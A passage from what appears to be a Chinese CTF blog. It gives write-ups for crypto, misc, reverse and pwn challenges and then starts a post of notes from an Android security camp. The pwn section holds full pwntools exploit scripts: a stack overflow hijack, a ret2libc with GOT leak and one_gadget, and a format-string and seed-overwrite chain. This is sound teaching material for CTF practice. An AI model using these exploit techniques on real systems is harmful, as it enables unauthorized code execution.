href="https://en.wikipedia.org/wiki/Pigpen_cipher">参考资料：维基百科-Pigpen_cipher</a></p><p><img src="https://s2.ax1x.com/2020/02/08/1RDnP0.png" alt="1RDnP0.png"></p><h3 id="knock-knock"><a href="#knock-knock" class="headerlink" title="knock knock"></a>knock knock</h3><p>摩斯电码，没有什么技术含量，也是调查问卷评为无聊的一题了，直接百度Google一把梭找到链接直接转换，题目提示了 flag 为有意义小写字母及数字，所以要是转成大写的得自己转成小写，送分题。</p><h3 id="F-k-your-brain"><a href="#F-k-your-brain" class="headerlink" title="F**k your brain"></a>F**k your brain</h3><p>brainfuck 编码，也是Google一下就找到在线网站，直接解编码就可以，主要是需要认得出来和学会根据题目等信息去寻找信息，送分题。</p><h3 id="look-at-your-keyboard"><a href="#look-at-your-keyboard" class="headerlink" title="look at your keyboard"></a>look at your keyboard</h3><p>关键词 keyboard，那就看键盘，可以看到每一个以空格分隔的字符串，在键盘上刚好圈出一个字母，加上格式 wctf{} 即可，送分题。</p><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>根据题目不难想到是base编码的变种，并且table都已经给出来了，不懂的可以参考<a href="https://en.wikipedia.org/wiki/Base64">维基百科-base64</a>，题目只是把表换了一下，并且这种题可以先根据表把给出的编码字母替换掉，再进行正常的 base64 解码，这样操作就比较简单。</p><p>手动也能做，这里贴一下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>string1 = <span class="hljs-string">&quot;wctfEFGHIOPQJKLMNRSTUVklmWXYZabBdeDghijnop45678qrsCuvAxyz01239+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>base = <span class="hljs-string">b&#x27;axKvWn7DmlKiKgRBJlKBWnV8BN==&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> base:<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(i) != <span class="hljs-string">&#x27;=&#x27;</span>:<br>index = string1.find(<span class="hljs-built_in">chr</span>(i))<br>flag += string2[index]<br><span class="hljs-keyword">else</span>:<br>flag += <span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">d2N0ZntiYXNlNjRfMXNfZnVufQ==<br>b&#x27;wctf&#123;base64_1s_fun&#125;&#x27;<br>[Finished in 0.1s]<br></code></pre></td></tr></table></figure><p>密码学题都是送分题，这里不多说。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="武汉加油-中国加油"><a href="#武汉加油-中国加油" class="headerlink" title="武汉加油 中国加油"></a>武汉加油 中国加油</h3><p>签到题，把 flag 复制就可以，送分题。</p><h3 id="Different"><a href="#Different" class="headerlink" title="Different"></a>Different</h3><p>题目说了 Different，那就是找不同，一般是比对十六进制数据，用 Beyond Compare 打开对比，标红差别就行，送分题。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDUG6.png" alt="1RDUG6.png"></p><h3 id="You-are-a-good-man"><a href="#You-are-a-good-man" class="headerlink" title="You are a good man"></a>You are a good man</h3><p>题目信息写了180cm，然后放出hint说很高，那直接把解题思路都说清楚了：改图片高度。我们先右键查看一下它的尺寸</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDDqH.png" alt="1RDDqH.png"></p><p>1125，我们用程序员计算器（Windows自带）将十六进制数计算出来，为 465。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD6II.png" alt="1RD6II.png"></p><p>然后用 Winhex 打开(其它十六进制编辑器也可以，如010 Editor等)，寻找 04 65的关键字样，注意第二个才是高，将他改高一点即可，如改成1400，转换成十六进制就是 578，即05 78，修改后保存即可（预期解是1313）。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDgit.png" alt="1RDgit.png"></p><p>​</p><p>这是原图</p><p><img src="https://s2.ax1x.com/2020/02/08/1RHDOJ.jpg" alt="1RHDOJ.jpg"></p><h3 id="Guess-Where-I-am"><a href="#Guess-Where-I-am" class="headerlink" title="Guess Where I am"></a>Guess Where I am</h3><p>这题灵感来自 C1CTF 的，也算是借鉴了，图片找了一个比较哲学的，虽然跟题目没有任何关系，题目表述为<code>Shakespeare will figure out you should take a guess</code>，一个 <code>out</code> 一个 <code>guess</code>，提示已经很明确是使用工具 <code>outguess</code>了，选择这个出题思路也是发现学校好像没什么接触过这个工具，刚好可以借机让大家知道一下。</p><p>安装工具自行Google即可，不做阐述，工具有了，这题也就是送分题了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用命令</span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">outguess -r guess.jpg flag</span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash"><span class="hljs-built_in">cat</span> flag | <span class="hljs-built_in">base64</span> -d</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">这里提取出来的数据是<span class="hljs-built_in">base64</span>编码过，因此需要再解码一下</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/08/1RDoZj.png" alt="1RDoZj.png"></p><h3 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h3><p>我是做梦没想到这个可以难到一些人，直接填写调查问卷即可拿flag，顺便拿点反馈做个统计，以后好改进，毕竟是Google表单，因此需要挂个梯子，题目也说明了需要科学上网，填好之后就送flag了，送分题。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDTds.png" alt="1RDTds.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h3><p>在学校主站上也放过，原题，也是bugku中最简单的逆向题，题目也提示了 <code>IDA is a good tool</code>，我们直接拖进 IDA，就可以看到一串比较明显的东西。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDxL4.png" alt="1RDxL4.png"></p><p>最简单的方法，手动按<code>r</code>，用眼睛看，flag就有了，主要是让大家把IDA装好并简单使用。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RHBy4.png" alt="1RHBy4.png"></p><h3 id="junkcode"><a href="#junkcode" class="headerlink" title="junkcode"></a>junkcode</h3><p><img src="https://s2.ax1x.com/2020/02/08/1W9Lh4.png" alt="1W9Lh4.png"></p><p>直接看到我们程序调用的这个地方会发现地址是红色的，没有识别成一个函数，主要是因为IDA是使用的线性扫描法，碰到花指令时就会出现如上情况，这种比较小程序的可以手动去花指令</p><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9j39.png" alt="1W9j39.png"></p><p>如果我们直接在开始处强行Create function，IDA会报如下错误<code>undefined instruction</code>在<code>text:00000000004007A3</code>，过去看一下</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9vcR.png" alt="1W9vcR.png"></p><p>很明显中间有一个Byte的指令根本没有用到，我们把它nop（机器码0x90，代表什么也不做）掉</p><p>可以Ctrl+Alt+K使用keypatch，也可以到HEX里面找到对应位置按F2修改成90，效果如下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9xj1.png" alt="1W9xj1.png"></p><p>然后在此处按C把数据转成指令</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCSnx.png" alt="1WCSnx.png"></p><p>再回来create就发现能成功了：</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCpB6.png" alt="1WCpB6.png"></p><h4 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h4><p>但是无法f5，会显示</p><p><img src="https://s2.ax1x.com/2020/02/08/1WC9HK.png" alt="1WC9HK.png"></p><p>是因为这里还有一个花指令</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCPAO.png" alt="1WCPAO.png"></p><p>这个add rsp,64h显然没有任何作用，可是这种指令会干扰IDA分析函数，add rsp一般只出现在函数调用后用来释放参数空间和对齐，直接nop掉这条指令再f5</p><p><img src="https://s2.ax1x.com/2020/02/08/1WCiND.png" alt="1WCiND.png"></p><p>接下来就是正常的程序分析了</p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>按 r 将 <code>dest</code> 转成字符形式</p><p><img src="https://s2.ax1x.com/2020/02/09/1fIFU0.png" alt="1fIFU0.png"></p><p>我们跟踪 <code>src</code> 看到为<code>k^a3``7z</code></p><p><img src="https://s2.ax1x.com/2020/02/09/1fIiEq.png" alt="1fIiEq.png"></p><p>写脚本计算出来就可以了，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">b&#x27;wdviO&#123;Uk^a3``7z&#x27;</span><br>flag1 = <span class="hljs-string">&#x27;&#x27;</span><br>flag2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>flag1 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">str</span>[i] - i)<br>flag2 += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">str</span>[i+<span class="hljs-number">8</span>] ^ i)<br>flag = flag1 + flag2<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">λ python exp.py<br>wctf&#123;JuNk_c0de1&#125;<br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>一个基础栈溢出</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9TBV.png" alt="1W9TBV.png"></p><p>这个题本身没有开保护，旨在想让你们先了解一下什么是栈溢出</p><p><img src="https://s2.ax1x.com/2020/02/08/1W977T.png" alt="1W977T.png"></p><p>首先打印了一个函数地址</p><p>对应的函数如下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1W94cn.png" alt="1W94cn.png"></p><p>然后write出提示之后通过gets输入造成栈溢出，这里的<code>gets(&amp;v5,&quot;&gt;&quot;)</code>带着一个<code>&quot;&gt;&quot;</code>主要是ida识别的时候会有些问题，这个<code>&quot;&gt;&quot;</code>字符串的地址本来是前一个<code>write</code>函数的第二个参数，这里识别出错就成了gets带着两个参数</p><h4 id="计算偏移量"><a href="#计算偏移量" class="headerlink" title="计算偏移量"></a>计算偏移量</h4><p>既然知道是栈溢出了，首先就要计算偏移量，v5从<code>[rbp-40h]</code>的地方开始，然后<code>[rbp]</code>处还有8个字节，所以构造的payload就应该是’a’*0x40+’b’*0x8+p64(想要劫持到的函数地址)，实现程序流劫持</p><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><p>具体exp如下(因为我写exp的时候都是用的一个Demo.py，所以具体的实现过程只用看<code># todo here</code>即可，这里只有两行)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./warmup&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =</span><br><span class="hljs-string">Port =</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>ub_offset = <span class="hljs-number">0x3c4b30</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-comment">#log.info(&quot;\033[1;36m&quot; + hex(bin_addr) + &quot;\033[0m&quot;)</span><br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0x40060d</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>后面的题就是想拿给18级做的了，19级能搭起前面这个题的环境还有成功复现就很不错了XD</p><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W95Xq.png" alt="1W95Xq.png"></p><p>开启栈不可执行，没有canary、PIE</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9h1s.png" alt="1W9h1s.png"></p><p>先输入到<code>buf 0xA</code>字节，然后<code>read(0,&amp;s1,0x100)</code>一个很明显的栈溢出，后面的ok和fail没什么用</p><p>由于只有一次溢出，程序也没有后门，所以我们需要先leak出一个libc的地址，然后漏洞点重复利用，回到main，然后ret2libc</p><h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p>先用<code>ROPgadget</code>寻找<code>gadget：pop rdi ret</code></p><p>然后第一次的payload：<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)</code></p><p>利用<code>puts_plt</code>把<code>puts</code>函数的GOT表项打出来，然后回到main</p><p>第二次根据puts函数的地址和固定偏移计算出<code>libc</code>的加载地址，至于这些偏移可以在脚本里面写<code>symbols[&#39;puts&#39;]</code>也可以直接用<code>gdb</code>调试时 ：p puts然后<code>vmmap</code>查看基址，相减得到偏移</p><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><p>得到基址之后使用one_gadget，满足限制条件即可，或者利用libc里面的<code>/bin/sh</code>地址，调用<code>system</code>也行（个人推荐用one_gadget，方便很多）</p><p>第二次的payload：<code>payload=&#39;a&#39;*0x20+&#39;b&#39;*8+p64(libc_base+one_gadget_offset)</code></p><h4 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./pwn1&#x27;</span>      <span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary         <span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)    <span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =</span><br><span class="hljs-string">Port =</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>ub_offset = <span class="hljs-number">0x3c4b30</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-comment">#log.info(&quot;\033[1;36m&quot; + hex(bin_addr) + &quot;\033[0m&quot;)</span><br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&#x27;your name\n&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;Coldshield&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;the key?\n&#x27;</span>)<br><br>prdi_ret=<span class="hljs-number">0x00000000004012ab</span><br>puts_GOT=<span class="hljs-number">0x404018</span><br>puts_plt=<span class="hljs-number">0x401030</span><br>main=<span class="hljs-number">0x401162</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(prdi_ret)+p64(puts_GOT)+p64(puts_plt)+p64(main)<br><br>p.send(payload)<br><br>puts_offset=<span class="hljs-number">0x6f690</span><br>one_gadget_offset=<span class="hljs-number">0x45216</span><br>p.recvuntil(<span class="hljs-string">&#x27;fail!\n&#x27;</span>)<br>libc_base=my_u64(p.recv(<span class="hljs-number">6</span>))-puts_offset<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + <span class="hljs-string">&#x27;libc_base:&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;your name\n&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;Coldshield&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;the key?\n&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(libc_base+one_gadget_offset)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h3><p>这个题是我出的一个题，具体结合了格式化字符串还有栈上变量的覆盖</p><h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h4><p><img src="https://s2.ax1x.com/2020/02/08/1W9bAU.png" alt="1W9bAU.png"></p><p>没有canary和PIE</p><p><img src="https://s2.ax1x.com/2020/02/08/1W9qNF.png" alt="1W9qNF.png"></p><p><code>read(0,&amp;buf,0x30)</code>很明显能溢出到<code>seed</code>，覆盖其为我们控制的值就可以预测rand()产生的值</p><p>通过随机数检测之后，下面有一个格式化字符串漏洞，是将我们前面用来覆盖<code>seed</code>输入的name打印出来，直接打印栈上任何存在的一个<code>libc</code>地址即可（可以直接看有没有哪个值是属于<code>libc</code>的），但是其中main函数的返回地址固定是<code>___libc_start_main</code>中的偏移，具体见我之前暑假写的ELF执行全流程，所以计算出调用<code>printf</code>时这个返回地址的偏移即可</p><p>payload1(name)：<code>p.send(&#39;%19$p&#39;.ljust(0x28,&#39;a&#39;)+p64(0))</code></p><p>最后一个say something只能使用<code>one_gadget</code>，因为溢出字节只到了返回地址</p><p>payload2：<code>payload=&#39;\x00&#39;*0x50+&#39;b&#39;*8+p64(libc_base+0x45216)</code></p><h4 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./rand&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =</span><br><span class="hljs-string">Port =</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>ub_offset = <span class="hljs-number">0x3c4b30</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-comment">#log.info(&quot;\033[1;36m&quot; + hex(bin_addr) + &quot;\033[0m&quot;)</span><br><br><span class="hljs-comment"># todo here</span><br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>lib.srand(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#gdb.attach(p,&quot;b *0x40081C&quot;)</span><br>p.recvuntil(<span class="hljs-string">&#x27;name?\n&#x27;</span>)<br><br>p.send(<span class="hljs-string">&#x27;%19$p&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p64(<span class="hljs-number">0</span>))<br><br>p.recvuntil(<span class="hljs-string">&#x27;rand game\n&#x27;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>num=lib.rand() % <span class="hljs-number">999</span><br>p.sendline(<span class="hljs-built_in">str</span>(num))<br>p.recvuntil(<span class="hljs-string">&#x27;Win\n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Your name is:\n&#x27;</span>)<br><br>libc_base=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x20830</span><br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + <span class="hljs-built_in">hex</span>(libc_base) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br>payload=<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(libc_base+<span class="hljs-number">0x45216</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;something?\n&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p><code>suctf playfmt</code>原题，可以自己上网找找wp，至于<code>fopen</code>之后为什么能够这样修改偏移可以改到对应的flag地址，可以了解一下IO file，不过比赛时这种偏移可以直接调试看就好了</p><p>参考：<a href="https://cloud.tencent.com/developer/article/1492955">https://cloud.tencent.com/developer/article/1492955</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android移动安全</title>
    <link href="/2020/01/23/android_sec/"/>
    <url>/2020/01/23/android_sec/</url>
    
    <content type="html"><![CDATA[<p><code>2020年xman冬令营-哈尔滨营</code>，以“移动安全”为主题，内容主要为移动应用安全渗透测试，移动应用程序逆向，移动恶意应用分析，Android内核漏洞分析，物联网Iot设备漏洞挖掘。<br>概述、该文档仅作为学习笔记。</p><ul><li>第一天梆梆安全张宁老师，以安卓逆向基础为主，内容从安卓系统架构与运行机制到安卓逆向常用工具与hook技术、以及安卓四大组件相关安全问题。</li><li>第二天腾讯玄武实验室m4bln老师，以安卓逆向为主，讲解了逆向流程，安卓端的逆向特点，以及反调试、代码混淆等知识。</li><li>第三天安天的老师，介绍了实战中移动端安全，从地下产业到移动端APT对抗，更高级的apk分析手段、方法，以及现安全公司所面临难题，对机器学习应用与移动端安全领域做了简单的概述。</li><li>第四天复旦白泽dotsu师傅分享了CTF中的安卓相关问题。</li><li>第五天华为的海归博士、木子李大师傅给大家分享了分布式网络以及华为分布式终端相关知识、介绍了基于短距通信的漏洞挖掘基础知识，内容包括Wifi、Bluetooth、等基础知识、介绍性分析了终端的网络攻击面。着重讲解了俗称p2p网络wifi-direct协议。</li><li>第六天腾讯玄武实验室刘慧明老师、针对更高级的知识—-安卓内核漏洞挖掘做了讲解，介绍安卓内核linux内核基础知识、开源协议等，针对安卓内核攻击面以及利用整体思路进行了简单介绍。重点讲解dirty cow漏洞原理、cve-2019-2215内核漏洞，着重介绍了fuzz技术，内核fuzz工具AFL、Syzkaller。</li><li>第七天结营赛。</li></ul><p>整理一份ppt以及相关资料（哈工大营）：链接：<a href="https://pan.baidu.com/s/1b0AfIwxdjDn7aSzgFkNPQQ">https://pan.baidu.com/s/1b0AfIwxdjDn7aSzgFkNPQQ</a> 提取码：d4lh</p><h2 id="第一天-01月13日"><a href="#第一天-01月13日" class="headerlink" title="第一天 01月13日"></a>第一天 01月13日</h2><h3 id="Android系统架构与运行机制"><a href="#Android系统架构与运行机制" class="headerlink" title="Android系统架构与运行机制"></a>Android系统架构与运行机制</h3><h4 id="五层架构"><a href="#五层架构" class="headerlink" 